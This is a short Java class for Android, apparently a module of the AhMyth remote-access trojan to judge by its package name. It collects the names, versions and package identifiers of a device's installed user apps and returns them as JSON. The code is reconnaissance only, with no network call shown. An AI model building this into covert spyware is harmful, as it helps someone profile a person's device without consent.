package ahmyth.mine.king.ahmyth;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class AppsManager {
    public static JSONObject getAppsInfo(){

        try {
            JSONObject apps = new JSONObject();
            JSONArray list = new JSONArray();

            List<PackageInfo> packList = MainService.getContextOfApplication().getPackageManager().getInstalledPackages(0);
            for (int i=0; i < packList.size(); i++)
            {
                PackageInfo packInfo = packList.get(i);
                if (  (packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0)
                {
                    String appName = packInfo.applicationInfo.loadLabel(MainService.getContextOfApplication().getPackageManager()).toString();
                    JSONObject app = new JSONObject();
                    app.put("nameApp", appName+" "+packInfo.versionName);
                    app.put("package", packInfo.packageName);
                    list.put(app);
                }
            }


            apps.put("appsList", list);
            return apps;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;

    }
}
